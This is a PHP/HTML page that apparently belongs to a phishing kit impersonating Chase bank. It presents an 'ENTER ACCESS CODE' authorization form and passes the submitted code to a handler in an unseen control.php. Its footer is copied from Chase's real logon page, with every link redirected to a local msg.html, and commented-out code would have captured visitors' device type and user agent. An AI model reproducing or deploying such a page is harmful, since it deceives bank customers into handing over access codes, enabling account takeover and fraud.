<?php
require_once("control.php");

if (isset($_POST["access"]) && !empty($_POST["access"])) {
    $code = $_POST["code"];
    if (!empty($code)) {
        $msg = $call->access($code);
    } else {
        $msg = "Please input access code";
    }
    
}
// require_once("./Mobile-Detect/src/MobileDetect.php");
// $detect = new \Detection\MobileDetect;
// $deviceType = ($detect->isMobile() ? ($detect->isTablet() ? 'tablet' : 'phone') : 'computer');
// $msg1 = $detect->getUserAgent();
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Bank Account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="style.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="style2.css" />
    <link rel="stylesheet" type="text/css" media="screen" href="style_min.css" />
    <script src="main.js"></script>
    <style>
    .msg{
        font-size: 13px;
        color : red;
    }
    </style>
</head>
<body>
    <div class="dashboard"><h1>AUTHORIZATION</h1></div>
    <br><br>
    <div class="main"><br>
        <h5>ENTER ACCESS CODE</h5><br>
        <div>
            <form method="post">
                <label for="access">CODE</label>
                <input name="code" type="text" placeholder="Code" size="30">
                <input name="access" type="submit" value="ENTER"><br><br>
                <p class="msg"><?php if(isset($msg) && !empty($msg)) { echo $msg; } ?></p>
                <!-- <h6><?php //print_r($msg1); ?></h6> -->
            </form>
        </div><br><br><br>
    </div>

    <footer class="logon-footer" id="logon-footer" data-has-view="true" style="margin-top:100px;">
            <div class="footer-container position-absolute" data-is-view="true" data-component-name="ROOT/SITE/logon/logonFooterMenu|logonFooterMenuComponent|LOGON_FOOTER_MENU|daa1051f-bb5f-4473-8e63-88a938196c3a">
                <div class="container">
                    <div class="social-links row">
                        <!-- <div class="col-xs-12"><span class="follow-us-text">Follow us:</span>
                             <ul class="icon-links">
                                <li class="facebook"><span id="requestChaseFacebook-iconanchor-wrapper"><a class="jpui iconaction " href="javascript:void(0);" id="requestChaseFacebook"> <span class="util accessible-text" id="accessible-requestChaseFacebook">Facebook: Opens dialog</span> <i class="fa fa-facebook" id="icon-requestChaseFacebook" aria-hidden="true"></i></a></span></li>
                                <li class="instagram"><span id="requestChaseInstagram-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseInstagram"> <span class="util accessible-text" id="accessible-requestChaseInstagram">Instagram: Opens dialog</span> <i class="fa fa-instagram" id="icon-requestChaseInstagram" aria-hidden="true"></i></a></span></li>
                                <li class="twitter"><span id="requestChaseTwitter-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseTwitter"> <span class="util accessible-text" id="accessible-requestChaseTwitter">Twitter: Opens dialog</span> <i class="fa fa-twitter" id="icon-requestChaseTwitter" aria-hidden="true"></i></a></span></li>
                                <li class="youtube"><span id="requestChaseYouTube-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseYouTube"> <span class="util accessible-text" id="accessible-requestChaseYouTube">YouTube: Opens dialog</span> <i class="fa fa-youtube" id="icon-requestChaseYouTube" aria-hidden="true"></i></a></span></li>
                                <li class="linkedin"><span id="requestChaseLinkedIn-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseLinkedIn"> <span class="util accessible-text" id="accessible-requestChaseLinkedIn">LinkedIn: Opens dialog</span> <i class="fa fa-linkedin" id="icon-requestChaseLinkedIn" aria-hidden="true"></i></a></span></li>
                            </ul>
                        </div> -->
                    </div>
    
                    <div class="footer-links row implement-ada-features-enabled">
                        <div class="col-xs-12">
                            <ul>
                                <li><span class="jpui link" id="requestContactUs-link-wrapper"><a class="link-anchor" id="requestContactUs" href="msg.html" aria-label=" Contact us ">Contact us</a></span></li>
                                <li><span class="jpui link" id="requestPrivacyNotice-link-wrapper"><a class="link-anchor" id="requestPrivacyNotice" href="msg.html" aria-label=" Privacy ">Privacy</a></span></li>
                                <li><span class="jpui link" id="requestSecurity-link-wrapper"><a class="link-anchor" id="requestSecurity" href="msg.html" aria-label=" Security ">Security</a></span></li>
                                <li><span class="jpui link" id="requestTermsOfUse-link-wrapper"><a class="link-anchor" id="requestTermsOfUse" href="msg.html" aria-label=" Terms of use ">Terms of use</a></span></li>
                                <li><span class="jpui link" id="requestAccessibility-link-wrapper"><a class="link-anchor" id="requestAccessibility" href="msg.html" aria-label=" Accessibility ">Accessibility</a></span></li>
                                <li><span class="jpui link" id="requestMortgageLoanOriginators-link-wrapper"><a class="link-anchor" id="requestMortgageLoanOriginators" href="msg.html" aria-label=" SAFE Act: Chase Mortgage Loan Originators ">SAFE Act: Chase Mortgage Loan Originators</a></span></li>
                                <li><span class="jpui link" id="requestHomeMortgageDisclosureAct-link-wrapper"><a class="link-anchor" id="requestHomeMortgageDisclosureAct" href="msg.html" aria-label=" Fair Lending ">Fair Lending</a></span></li>
                                <li><span class="jpui link" id="requestAboutChase-link-wrapper"><a class="link-anchor" id="requestAboutChase" href="msg.html" aria-label=" About Chase ">About Chase</a></span></li>
                                <li><span class="jpui link" id="requestJpMorgan-link-wrapper"><a class="link-anchor" id="requestJpMorgan" href="msg.html" aria-label=" J.P. Morgan ">J.P. Morgan</a></span></li>
                                <li><span class="jpui link" id="requestJpMorganChaseCo-link-wrapper"><a class="link-anchor" id="requestJpMorganChaseCo" href="msg.html" aria-label=" JPMorgan Chase &amp; Co. ">JPMorgan Chase &amp; Co.</a></span></li>
                                <li><span class="jpui link" id="requestCareers-link-wrapper"><a class="link-anchor" id="requestCareers" href="msg.html" aria-label=" Careers ">Careers</a></span></li>
                                <li><span class="jpui link" id="requestEspanol-link-wrapper"><a class="link-anchor" id="requestEspanol" href="msg.html" aria-label=" Español ">Español</a></span></li>
                                <li><span class="jpui link" id="requestChaseCanada-link-wrapper"><a class="link-anchor" id="requestChaseCanada" href="msg.html" aria-label=" Chase Canada ">Chase Canada</a></span></li>
                                <li><span class="jpui link" id="requestSiteMap-link-wrapper"><a class="link-anchor" id="requestSiteMap" href="msg.html" aria-label=" Site map ">Site map</a></span></li>
                                <li>Member FDIC</li>
                                <li><i class="jpui equal-housing-lender icon" id="equalHousingLenderLabel" aria-hidden="true"></i> Equal Housing Opportunity</li>
                                <li class="copyright-label">(c) 2023 JPMorgan Chase &amp; Co.</li>
                            </ul>
                        </div>
                    </div>
    
                </div>
            </div>
        </footer>
    
</body>
</html>